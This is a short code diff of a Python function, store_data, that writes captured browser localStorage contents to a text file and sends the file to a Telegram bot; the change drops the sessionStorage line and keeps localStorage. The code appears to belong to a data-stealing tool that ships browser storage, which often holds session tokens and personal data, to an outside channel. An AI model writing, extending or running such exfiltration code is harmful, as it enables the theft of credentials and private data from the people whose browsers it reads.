@@ -77,8 +77,9 @@ def store_data():
 
     # Write the data to a text file
     with open(filename, 'w') as file:
-        file.write(f"localStorage: {local_storage}\n")
-        file.write(f"sessionStorage: {session_storage}\n")
+        form = local_storage
+        file.write(f"{form}\n")
+        #file.write(f"sessionStorage: {session_storage}\n")
 
     # Send the file to the Telegram bot
     send_file_to_telegram(filename)
